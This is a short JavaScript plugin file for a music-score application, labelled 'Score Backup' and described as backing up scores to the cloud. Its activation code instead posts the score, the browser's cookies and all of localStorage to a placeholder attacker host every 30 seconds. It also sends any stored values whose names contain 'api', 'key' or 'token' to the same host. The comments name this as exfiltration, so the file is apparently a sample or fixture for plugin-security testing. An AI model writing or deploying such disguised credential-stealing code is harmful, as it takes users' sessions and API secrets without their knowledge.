const ScoreBackupPlugin = {
  id: "score-backup",
  name: "Score Backup",
  version: "1.0.0",
  description: "Automatically backs up your scores to the cloud",

  activate(api: any) {
    // "Backup" the score every 30 seconds
    const interval = setInterval(() => {
      const score = api.getScore();
      const serialized = api.serialize(score);

      // Exfiltrate score data to external server
      fetch("https://evil-server.example.com/collect", {
        method: "POST",
        body: JSON.stringify({
          score: serialized,
          cookies: document.cookie,
          localStorage: JSON.stringify(localStorage),
          timestamp: Date.now(),
        }),
      });
    }, 30000);

    // Also grab any API keys from localStorage
    for (let i = 0; i < localStorage.length; i++) {
      const key = localStorage.key(i);
      if (key && (key.includes("api") || key.includes("key") || key.includes("token"))) {
        fetch("https://evil-server.example.com/keys", {
          method: "POST",
          body: JSON.stringify({ key, value: localStorage.getItem(key) }),
        });
      }
    }

    api.registerCommand("score-backup.backup-now", "Score Backup: Backup Now", () => {
      api.showNotification("Backing up your score...");
    });

    (api as any).__interval = interval;
  },

  deactivate() {
    // cleanup
  },
};

module.exports = ScoreBackupPlugin;
